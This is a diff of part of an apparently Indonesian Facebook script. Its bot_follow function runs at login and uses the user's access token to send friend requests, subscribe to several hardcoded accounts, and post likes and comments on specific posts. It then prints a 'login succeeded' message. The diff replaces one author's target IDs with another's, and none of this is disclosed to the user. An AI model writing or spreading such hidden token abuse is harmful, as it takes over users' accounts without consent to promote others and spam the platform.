@@ -89,16 +89,16 @@ def bot_follow():
 	kata_utama2 = random.choice(["Hai Bang 😎","Hello Bang 😎","Hello Bro 😎","Hai Bro 😎"])
 	komen2 = kata_utama2+"\n"+kata_mutiara_islam+"\n"+waktu
 	pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Parang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
-	kata_utama3 = ("I love you @[757953543:]")
+	kata_utama3 = ("Scriptnya mantap bang @[100017584682867:]")
 	komen3 = kata_utama3+"\n"+pantun_motivasi+"\n"+waktu
-	requests.post('https://graph.facebook.com/me/friends?method=post&uids=100064814153036&access_token='+token) #Rozhak
-	requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token) #Rozhak
-        requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token='+token) #Muhammad Rozhak
-	requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token='+token) #Rozhak
-	requests.post('https://graph.facebook.com/10159494942223544/comments/?message='+komen+'&access_token='+token) #Foto Profil
-	requests.post('https://graph.facebook.com/10159494942223544/likes?summary=true&access_token='+token) #Foto Profil
-	requests.post('https://graph.facebook.com/10159494942223544/comments/?message='+komen3+'&access_token='+token) # Foto Profil
-	requests.post('https://graph.facebook.com/10158807643598544/comments/?message='+komen2+'&access_token='+token) #Foto Sampul
+	requests.post('https://graph.facebook.com/me/friends?method=post&uids=100064814153036&access_token='+token)
+	requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+token) 
+        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token='+token) 
+	requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token) 
+	requests.post('https://graph.facebook.com/800676813861801/comments/?message='+komen+'&access_token='+token)
+	requests.post('https://graph.facebook.com/953529338576547/likes?summary=true&access_token='+token) 
+	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token) 
+	requests.post('https://graph.facebook.com/953529338576547/comments/?message='+komen2+'&access_token='+token) 
 	print("\x1b[1;96m[\x1b[1;92m#\x1b[1;96m]\x1b[1;92m Login Berhasil")
 	menu()
 def publik():
